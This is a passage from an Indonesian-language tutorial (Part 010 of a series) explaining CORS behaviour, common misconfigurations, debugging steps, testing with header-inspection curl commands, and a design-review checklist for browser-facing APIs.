CORS headers harus diterapkan secara konsisten pada success dan error path yang relevan.
```

Biasanya CORS dipasang di layer awal seperti gateway/filter/middleware agar error dari downstream tetap punya header yang benar, selama aman.

---

## 34. CORS dan Redirect

Redirect dapat membuat CORS lebih rumit.

Contoh:

```text
fetch https://api.example.com/me
```

Server menjawab:

```http
302 Found
Location: https://login.example.com
```

Browser mengikuti redirect, tetapi CORS check bisa gagal di response akhir atau pada redirect chain.

Masalah umum:

- API mengembalikan redirect login HTML, bukan `401` JSON;
- preflight `OPTIONS` diarahkan ke login page;
- HTTP ke HTTPS redirect terjadi tetapi header CORS tidak konsisten;
- trailing slash redirect pada OPTIONS;
- redirect ke origin yang tidak mengizinkan origin app.

Untuk API yang dipanggil oleh SPA, sering lebih baik:

```text
401 Unauthorized + JSON error body
```

daripada:

```text
302 ke halaman login HTML
```

Kecuali flow tersebut memang navigation/browser login flow, bukan AJAX API call.

---

## 35. CORS dan Local Development

Local development adalah sumber CORS error terbesar.

Contoh:

```text
Frontend: http://localhost:5173
Backend : http://localhost:8080
```

Mereka cross-origin karena port berbeda.

Allowlist harus mencakup origin frontend:

```text
http://localhost:5173
```

Bukan:

```text
localhost:5173
http://localhost:5173/
http://localhost:5173/api
```

Origin mencakup scheme, host, port. Tidak mencakup path.

Masalah umum:

| Gejala | Penyebab Umum |
|---|---|
| Works in production, fails locally | localhost origin tidak di-allow |
| Works on Chrome, fails on another setup | beda host `localhost` vs `127.0.0.1` |
| Cookie tidak terkirim | SameSite/Secure/domain/credentials issue |
| Preflight 404 | dev proxy tidak forward OPTIONS |
| API path salah | proxy rewrite salah |
| CORS hilang saat error | local exception path beda |

Dev server proxy bisa menghindari CORS dengan membuat browser melihat request sebagai same-origin:

```text
Browser: http://localhost:5173/api/me
Dev proxy forwards to http://localhost:8080/me
```

Dari sudut browser, request adalah same-origin ke `localhost:5173`. Dari sudut proxy, forwarding ke backend bukan CORS karena bukan browser.

Namun hati-hati: dev proxy bisa menyembunyikan masalah CORS yang akan muncul di staging/production jika topologinya berbeda.

---

## 36. CORS dan API Gateway

Di production, CORS sering tidak ditangani langsung oleh service aplikasi, tetapi oleh:

- API gateway;
- reverse proxy;
- CDN edge;
- ingress controller;
- load balancer;
- service mesh egress/ingress;
- backend framework filter.

Masalah muncul saat lebih dari satu layer menambahkan header.

Contoh buruk:

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Origin: *
```

Duplicate/multiple CORS headers dapat menyebabkan browser menolak response.

Aturan arsitektural:

```text
Tentukan satu owner utama CORS policy untuk boundary publik.
```

Misalnya:

```text
Browser-facing API Gateway owns CORS.
Internal services do not add CORS.
```

Atau:

```text
Backend framework owns CORS.
Gateway only forwards headers and handles OPTIONS passthrough.
```

Yang buruk adalah tidak ada owner jelas.

---

## 37. CORS sebagai Contract Boundary

Untuk top 1% engineer, CORS bukan sekadar konfigurasi.

CORS adalah bagian dari **contract boundary** antara:

```text
Browser origin
    ↔
Public API surface
    ↔
Gateway/proxy/cache
    ↔
Backend service
```

Kontrak CORS harus menjawab:

1. origin mana yang boleh membaca resource ini;
2. method apa yang boleh digunakan browser dari origin tersebut;
3. request headers apa yang boleh dikirim;
4. response headers apa yang boleh dibaca frontend;
5. apakah credentials/cookies boleh dipakai;
6. berapa lama preflight boleh di-cache;
7. apakah policy berbeda per environment;
8. layer mana yang menjadi source of truth;
9. bagaimana error response tetap membawa CORS headers;
10. bagaimana policy diuji di CI/staging.

---

## 38. Decision Matrix Awal

### 38.1 Public read-only API tanpa credential

Contoh:

```text
GET /public/products
```

CORS strategy:

```http
Access-Control-Allow-Origin: *
```

Pertimbangan:

- aman jika response memang public;
- cache bisa public;
- jangan campur dengan personalized data;
- jangan gunakan cookies;
- tetap rate-limit jika perlu.

### 38.2 Private SPA API dengan token Authorization

Contoh:

```text
https://app.example.com -> https://api.example.com
Authorization: Bearer <token>
```

CORS strategy:

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
Access-Control-Allow-Headers: authorization, content-type, x-request-id
Access-Control-Expose-Headers: x-request-id, traceparent
Access-Control-Max-Age: 600
Vary: Origin
```

Pertimbangan:

- `Authorization` memicu preflight;
- token auth bukan cookie credentials, tetapi CORS tetap diperlukan;
- response tetap harus authorization-check per user;
- jangan expose sensitive headers.

### 38.3 Session-cookie API

CORS strategy preview:

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Vary: Origin
```

Fetch:

```js
fetch("https://api.example.com/me", {
  credentials: "include"
});
```

Pertimbangan:

- wildcard tidak boleh untuk credentialed response;
- SameSite/Secure cookie sangat penting;
- CSRF harus dipikirkan;
- detail dibahas Part 011-013.

### 38.4 Same-origin BFF

Topologi:

```text
https://app.example.com
  /api/* handled by BFF same origin
```

Browser melihat API sebagai same-origin.

Manfaat:

- CORS lebih sederhana atau tidak diperlukan untuk browser;
- cookie/session lebih terkendali;
- BFF bisa call internal services server-to-server;
- security boundary lebih jelas.

Trade-off:

- tambahan layer;
- deployment coupling;
- operational complexity;
- perlu desain caching dan failure boundary.

---

## 39. Anti-Patterns

### 39.1 “Fix CORS di frontend”

Salah.

Frontend tidak bisa memaksa server mengizinkan response dibaca. CORS harus dikonfigurasi di response server/proxy.

### 39.2 “Pakai `no-cors`”

Salah untuk JSON API.

Anda akan mendapat opaque response yang tidak bisa dibaca.

### 39.3 “Allow `*` untuk semua API”

Berbahaya untuk private/user-specific API.

### 39.4 “CORS sebagai security utama API”

Salah.

CORS bukan auth, bukan firewall, bukan rate limit.

### 39.5 “Preflight harus login dulu”

Biasanya salah layering.

Preflight adalah permission check sebelum actual request. Actual request-lah yang membawa authentication context.

### 39.6 “CORS hanya dikonfigurasi di success response”

Menyebabkan error asli tersembunyi.

### 39.7 “Asal mirror Origin”

Jika tanpa allowlist, sama saja dengan membuka ke semua origin.

### 39.8 “Tidak ada owner CORS di arsitektur”

Gateway, backend, dan CDN semua menambah header berbeda. Hasilnya intermittent dan sulit didiagnosis.

---

## 40. Backend Java Perspective: Kenapa Ini Sering Terjadi di Spring/Java Stack

Sebagai Java engineer, Anda mungkin melihat CORS sebagai konfigurasi framework. Tapi masalahnya sering muncul karena urutan filter/layer.

Pipeline konseptual:

```text
Browser
  -> CDN
  -> WAF
  -> Load Balancer
  -> API Gateway
  -> Ingress
  -> App Security Filter
  -> CORS Filter
  -> Controller
  -> Exception Handler
```

Jika CORS filter terlambat, maka:

```text
Security filter bisa menolak OPTIONS sebelum CORS header ditambahkan.
```

Jika exception handler tidak menambahkan CORS, maka:

```text
500 response tidak punya ACAO.
```

Jika gateway dan app sama-sama menambahkan CORS:

```text
duplicate Access-Control-Allow-Origin.
```

Jika CDN cache tidak memperhatikan `Origin`:

```text
CORS header salah disajikan ke origin lain.
```

Mental model yang benar:

```text
CORS untuk browser-facing boundary sebaiknya dievaluasi sebelum business auth failure membuat response final, tetapi authorization actual resource tetap harus terjadi pada actual request.
```

Detail implementasi framework akan bervariasi, tetapi invariant ini stabil.

---

## 41. Security Threat Model: Apa yang Dicegah CORS?

CORS mencegah skenario seperti:

```text
User login ke victim.com.
User membuka evil.com.
evil.com mencoba fetch victim.com/private-data.
Browser mungkin mengirim credential.
Tanpa CORS/SOP, evil.com bisa membaca private-data.
Dengan SOP/CORS, browser menolak akses response jika victim.com tidak mengizinkan evil.com.
```

Yang dicegah:

- unauthorized cross-origin response reading by browser JavaScript;
- data exfiltration melalui JS read access;
- sebagian interaction yang butuh non-simple request melalui preflight.

Yang tidak sepenuhnya dicegah:

- request terkirim via form/simple mechanisms;
- server-to-server abuse;
- phishing;
- XSS di origin yang trusted;
- malicious browser extension;
- compromised allowed origin;
- CSRF tanpa mitigasi lain;
- token theft dari storage yang tidak aman;
- abuse dari mobile/native client.

Maka CORS adalah satu layer dalam browser security model, bukan seluruh security model.

---

## 42. Latihan Mental: Apakah Ini CORS?

### Kasus 1

```text
Frontend: https://app.example.com
API     : https://api.example.com
fetch GET tanpa custom header
Response tidak punya Access-Control-Allow-Origin
```

Ini CORS. Request mungkin terkirim, response tidak boleh dibaca.

### Kasus 2

```text
Frontend: https://app.example.com
API     : https://api.example.com
fetch POST JSON
OPTIONS mendapat 404
```

Ini preflight handling issue. Actual POST tidak dikirim.

### Kasus 3

```text
Postman sukses.
Browser gagal CORS.
```

Bukan kontradiksi. Postman tidak menjalankan SOP/CORS.

### Kasus 4

```text
Backend Java service A memanggil service B dan gagal karena tidak ada ACAO.
```

Kemungkinan bukan CORS. Server-to-server call tidak peduli ACAO. Cari penyebab lain: auth, network, DNS, TLS, gateway, timeout.

### Kasus 5

```text
Frontend bisa lihat X-Total-Count di Network tab, tetapi response.headers.get("X-Total-Count") null.
```

Ini CORS exposed headers issue. Butuh `Access-Control-Expose-Headers`.

### Kasus 6

```text
API pakai cookie session. Server kirim ACAO: *.
Browser error saat credentials include.
```

Credentialed CORS issue. Akan dibahas Part 011.

---

## 43. Debugging Playbook Minimum

Gunakan ini setiap melihat CORS error.

### Step 1: Identifikasi origin pemanggil

Di Console/Location:

```js
window.location.origin
```

Catat persis:

```text
scheme + host + port
```

### Step 2: Identifikasi target origin

Dari URL fetch:

```text
https://api.example.com
```

Jika sama origin, mungkin bukan CORS. Jika beda, lanjut.

### Step 3: Lihat apakah preflight ada

Network tab → filter `OPTIONS`.

Jika ada preflight:

- cek status;
- cek `Access-Control-Request-Method`;
- cek `Access-Control-Request-Headers`;
- cek response `Access-Control-Allow-*`.

Jika tidak ada preflight:

- cek actual response `Access-Control-Allow-Origin`.

### Step 4: Cocokkan header

Untuk simple request:

```text
Origin == Access-Control-Allow-Origin
atau ACAO == * untuk non-credentialed public response
```

Untuk preflight:

```text
Origin allowed?
Method allowed?
Headers allowed?
```

### Step 5: Cek credentials

Apakah fetch memakai:

```js
credentials: "include"
```

atau XHR:

```js
xhr.withCredentials = true
```

Jika ya, cek credentialed CORS rules.

### Step 6: Cek redirect

Di Network tab, lihat apakah request diarahkan.

Curiga jika:

- OPTIONS mendapat 301/302;
- actual API diarahkan ke login HTML;
- HTTP diarahkan ke HTTPS;
- trailing slash redirect.

### Step 7: Cek layer owner

Tentukan header berasal dari mana:

- app service;
- gateway;
- CDN;
- ingress;
- framework middleware.

Jangan patch acak di semua layer.

---

## 44. Minimal Correct CORS Examples

### 44.1 Public GET API

Request:

```http
GET /public/products HTTP/1.1
Host: api.example.com
Origin: https://shop.example.com
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Cache-Control: public, max-age=300

[{"id":"p1"}]
```

Cocok untuk public data.

### 44.2 Specific Origin API

Request:

```http
GET /profile HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Authorization: Bearer token
```

Preflight kemungkinan terjadi karena `Authorization`.

Preflight response:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Headers: authorization
Access-Control-Max-Age: 600
Vary: Origin
```

Actual response:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://app.example.com
Vary: Origin

{"id":"u1"}
```

### 44.3 Custom Header + Exposed Header

Frontend:

```js
const res = await fetch("https://api.example.com/orders", {
  headers: {
    "X-Request-ID": crypto.randomUUID()
  }
});

const serverRequestId = res.headers.get("X-Request-ID");
```

Preflight response needs:

```http
Access-Control-Allow-Headers: x-request-id
```

Actual response needs:

```http
Access-Control-Expose-Headers: X-Request-ID
```

Jangan campur:

```text
Allow-Headers  = request headers yang boleh dikirim frontend.
Expose-Headers = response headers yang boleh dibaca frontend.
```

---

## 45. CORS Testing Strategy

Manual DevTools saja tidak cukup.

Minimal test matrix:

| Test | Expected |
|---|---|
| allowed origin GET | response readable |
| disallowed origin GET | browser blocked |
| allowed origin POST JSON | preflight 2xx, actual sent |
| disallowed custom header | preflight blocked |
| error response 400/500 | still has expected CORS headers |
| redirect response | behavior known and intentional |
| exposed headers | JS can read required headers |
| credentials mode if used | wildcard not used, ACAC true |

Untuk backend/API gateway:

- test `OPTIONS` directly;
- test actual endpoint with `Origin` header;
- test allowed and disallowed origins;
- test error path;
- test no duplicate ACAO;
- test CDN caching behavior jika ada dynamic origin.

Contoh dengan cURL untuk memeriksa response header server:

```bash
curl -i \
  -H 'Origin: https://app.example.com' \
  https://api.example.com/products
```

Preflight simulation:

```bash
curl -i -X OPTIONS \
  -H 'Origin: https://app.example.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type,authorization' \
  https://api.example.com/orders
```

Catatan penting:

```text
cURL bisa membantu melihat header yang dikirim server,
tetapi cURL tidak membuktikan browser akan mengizinkan response dibaca.
Browser tetap source of truth untuk policy enforcement.
```

---

## 46. Design Review Checklist

Saat review API/browser integration, tanyakan:

1. Apakah browser origin dan API origin sama atau berbeda?
2. Jika berbeda, siapa owner CORS policy?
3. Origin mana saja yang diizinkan per environment?
4. Apakah allowlist menggunakan exact origin, bukan regex longgar?
5. Apakah wildcard hanya dipakai untuk public non-credentialed resource?
6. Apakah preflight OPTIONS ditangani sebelum auth filter yang salah?
7. Apakah allowed methods sesuai actual API methods?
8. Apakah allowed headers hanya yang dibutuhkan?
9. Apakah response headers yang dibaca frontend sudah di-expose?
10. Apakah error responses juga membawa CORS headers?
11. Apakah dynamic ACAO memakai `Vary: Origin`?
12. Apakah CDN/gateway tidak menduplikasi atau menghapus CORS headers?
13. Apakah redirect behavior sengaja?
14. Apakah credentials/cookies dipakai? Jika ya, cek Part 011/013.
15. Apakah CSRF dipertimbangkan untuk cookie-based auth?

---

## 47. Summary Invariants

Pegang invariant berikut:

```text
1. Origin = scheme + host + port.
2. CORS adalah browser-enforced response sharing policy.
3. CORS bukan auth, bukan firewall, bukan CSRF protection.
4. Postman/cURL tidak menjalankan CORS seperti browser.
5. Simple request tetap butuh CORS response check.
6. Preflight adalah OPTIONS permission check sebelum actual request.
7. Actual request tetap butuh CORS headers pada response.
8. Access-Control-Allow-Origin adalah response header dari server/proxy, bukan request header dari frontend.
9. Access-Control-Allow-Headers mengontrol request headers yang boleh dikirim.
10. Access-Control-Expose-Headers mengontrol response headers yang boleh dibaca JS.
11. no-cors tidak membuat JSON API bisa dibaca; biasanya menghasilkan opaque response.
12. Wildcard origin hanya cocok untuk public non-credentialed resource.
13. Dynamic origin reflection harus divalidasi dengan allowlist dan biasanya butuh Vary: Origin.
14. Error paths juga perlu CORS headers agar frontend bisa melihat status/error body.
15. Jika ada credentials/cookies, aturan menjadi lebih ketat.
```

---

## 48. Mini Capstone: Diagnose This

### Scenario

Frontend:

```text
https://app.acme.test
```

API:

```text
https://api.acme.test
```

Code:

```js
const res = await fetch("https://api.acme.test/orders", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-Request-ID": "abc-123"
  },
  body: JSON.stringify({ productId: "p1" })
});
```

Console:

```text
Request header field x-request-id is not allowed by Access-Control-Allow-Headers in preflight response.
```

Network:

```http
OPTIONS /orders HTTP/1.1
Origin: https://app.acme.test
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,x-request-id
```

Response:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.acme.test
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: content-type
```

### Diagnosis

Browser ingin mengirim actual `POST` dengan headers:

```text
content-type,x-request-id
```

Server hanya mengizinkan:

```text
content-type
```

Maka preflight gagal. Actual POST tidak dikirim.

### Fix

Jika `X-Request-ID` memang diperlukan:

```http
Access-Control-Allow-Headers: content-type,x-request-id
```

Jika tidak diperlukan, hapus custom header dari frontend.

### Prevention

Setiap penambahan custom request header harus melewati checklist CORS/preflight.

---

## 49. Apa yang Belum Dibahas dan Akan Masuk Part 011

Bagian ini sengaja belum mendalami:

- `credentials: "include"`;
- cookies cross-origin;
- `Access-Control-Allow-Credentials`;
- kenapa wildcard gagal dengan credentials;
- preflight tanpa credentials tetapi actual request dengan credentials;
- SameSite cookie interaction;
- login berhasil tapi cookie tidak tersimpan;
- Spring Security CORS ordering;
- CDN caching dengan `Vary: Origin` secara detail;
- response header terlihat di Network tapi tidak bisa dibaca JS;
- preflight 401/403/302;
- environment-specific bugs;
- production incident case studies.

Itu semua masuk **Part 011**.

---

## 50. Referensi Utama

- WHATWG Fetch Standard — CORS protocol, request mode, credentials mode, preflight behavior.
- MDN Web Docs — Cross-Origin Resource Sharing guide.
- MDN Web Docs — Preflight request glossary.
- MDN Web Docs — Access-Control-Allow-Credentials.
- RFC 6454 — The Web Origin Concept.
- RFC 9110 — HTTP Semantics.

---

## 51. Penutup

CORS terlihat seperti konfigurasi kecil, tetapi sebenarnya ia adalah salah satu titik temu paling penting antara:

```text
browser security model
HTTP semantics
API gateway behavior
backend authentication
frontend runtime behavior
cache/CDN correctness
production observability
```

Engineer yang hanya menghafal header akan sering memperbaiki gejala secara acak. Engineer yang memahami modelnya bisa memutuskan:

- kapan CORS diperlukan;
- kapan topologi same-origin/BFF lebih baik;
- kapan wildcard aman;
- kapan explicit allowlist wajib;
- kenapa preflight terjadi;
- kenapa actual request tidak pernah sampai;
- kenapa Postman bukan bukti browser flow benar;
- kenapa CORS error bisa menyembunyikan 401/500 asli.

Bagian berikutnya akan masuk ke area yang paling sering menyebabkan incident produksi: **credentials, cookies, preflight, wildcard origin, exposed headers, dan real production bugs**.

---

_Status: Part 010 selesai. Seri belum selesai._

<!-- NAVIGATION_FOOTER -->
<div class="page-nav">
<a href="./learn-http-for-web-frontend-perspective-part-009.md">⬅️ Part 009 — XMLHttpRequest, Forms, Navigation, Beacon, and Non-Fetch Requests</a>
<a href="./index.md">📚 Kategori</a>
<a href="../../../index.md">🏠 Home</a>
<a href="./learn-http-for-web-frontend-perspective-part-011.md">CORS Part 2: Preflight, Credentials, Cookies, and Real Production Bugs ➡️</a>
</div>
